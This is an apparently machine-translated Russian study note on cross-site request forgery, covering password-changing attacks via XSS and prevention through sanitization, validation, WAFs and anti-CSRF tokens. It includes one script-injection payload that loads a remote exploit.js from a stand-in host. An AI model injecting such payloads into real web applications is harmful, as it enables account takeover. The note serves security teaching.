*** Cross-Site Request Forgery (CSRF)
Подделка межсайтовых запросов (CSRF) 
	
	Третий тип уязвимости внешнего интерфейса, вызванный нефильтрованным
	пользовательским вводом, — это подделка межсайтовых запросов (CSRF) .
	CSRFатаки могут использовать XSSуязвимости для выполнения определенных
	запросов, и APIвызывает веб-приложение, в котором жертва в настоящее время
	аутентифицирована. Это позволит злоумышленнику выполнять действия как
	аутентифицированный пользователь. Он также может использовать другие
	уязвимости для выполнения тех же функций, например, использование параметров
	HTTP для атак.
		
		https://owasp.org/www-community/attacks/csrf

	Обычный CSRF атака для получения более высокого привилегированного доступа к
	веб-приложению заключается в создании JavaScriptполезная нагрузка, которая
	автоматически меняет пароль жертвы на значение, установленное
	злоумышленником. Как только жертва просматривает полезную нагрузку на
	уязвимой странице (например, вредоносный комментарий, содержащий JavaScript
	CSRFполезная нагрузка), JavaScriptкод будет выполняться автоматически. Он
	будет использовать сеанс входа в систему жертвы, чтобы изменить свой пароль.
	Как только это будет сделано, злоумышленник может войти в учетную запись
	жертвы и контролировать ее.

	CSRF также может быть использован для атаки на администраторов и получения
	доступа к их учетным записям. Администраторы обычно имеют доступ к
	конфиденциальным функциям, которые иногда могут использоваться для атаки и
	получения контроля над внутренним сервером (в зависимости от функций,
	предоставляемых администраторам в данном веб-приложении). Следуя этому
	примеру, вместо использования JavaScriptкод, который вернул бы файл cookie
	сеанса, мы бы загрузили удаленный .js( JavaScript) файл следующим образом: 
		
		"><script src=//www.example.com/exploit.js></script>
	
	The exploit.js файл будет содержать вредоносный JavaScriptкод, меняющий
	пароль пользователя. Разработка exploit.jsв этом случае требуется знание
	процедуры смены пароля этого веб-приложения и APIs. Злоумышленник должен
	создать JavaScriptкод, который воспроизводил бы желаемую функциональность и
	автоматически выполнял бы ее (т. е. JavaScriptкод, который изменяет наш
	пароль для этого конкретного веб-приложения).

	### Prevention
	Профилактика 

		Хотя на серверной части должны быть меры для обнаружения и фильтрации
		пользовательского ввода, также всегда важно фильтровать и
		дезинфицировать пользовательский ввод на внешнем интерфейсе, прежде чем
		он достигнет серверной части, особенно если этот код может отображаться
		непосредственно на клиенте. -сайд, не сообщаясь с задним концом. Два
		основных элемента управления должны применяться при принятии
		пользовательского ввода: 
		
			Sanitization 	
				
				Удаление специальных символов и нестандартных символов из
				пользовательского ввода перед его отображением или сохранением.

			Validation 	
				
				Обеспечение того, чтобы отправленный пользовательский ввод
				соответствовал ожидаемому формату (т. е. отправленное
				электронное письмо соответствовало формату электронного письма)

		Кроме того, также важно очищать отображаемый вывод и удалять любые
		специальные/нестандартные символы. Если злоумышленнику удастся обойти
		фильтры очистки и проверки переднего плана и сервера, он все равно не
		причинит никакого вреда интерфейсу.
			
		Как только мы очистим и/или проверим пользовательский ввод и
		отображаемый вывод, мы сможем предотвратить такие атаки, как HTML
		Injection, XSS, или же CSRF. Другим решением может быть реализация
		брандмауэра веб-приложений (WAF) , который должен автоматически
		предотвращать попытки внедрения. Однако следует отметить, что решения
		WAF потенциально можно обойти, поэтому разработчики должны следовать
		передовым методам кодирования, а не просто полагаться на устройство для
		обнаружения/блокировки атак.
			
			https://en.wikipedia.org/wiki/Web_application_firewall

		Что касается CSRF, многие современные браузеры имеют встроенные средства
		защиты от CSRF, которые предотвращают автоматическое выполнение
		JavaScriptкод. Кроме того, многие современные веб-приложения имеют меры
		против CSRF, включая определенные заголовки и флаги HTTP, которые могут
		предотвратить автоматические запросы (т. е. anti-CSRFжетон или
		http-only/ X-XSS-Protection). Некоторые другие меры могут быть приняты
		на функциональном уровне, например, требование от пользователя ввести
		свой пароль перед его сменой. Многие из этих мер безопасности можно
		обойти, и поэтому эти типы уязвимостей могут по-прежнему представлять
		серьезную угрозу для пользователей веб-приложений. Вот почему на эти
		меры предосторожности следует полагаться только как на второстепенную
		меру, и разработчики всегда должны следить за тем, чтобы их код не был
		уязвим ни для одной из этих атак.


		В этой памятке по предотвращению подделки межсайтовых запросов от OWASP
		более подробно обсуждаются атаки и меры предотвращения. 		
			
			https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
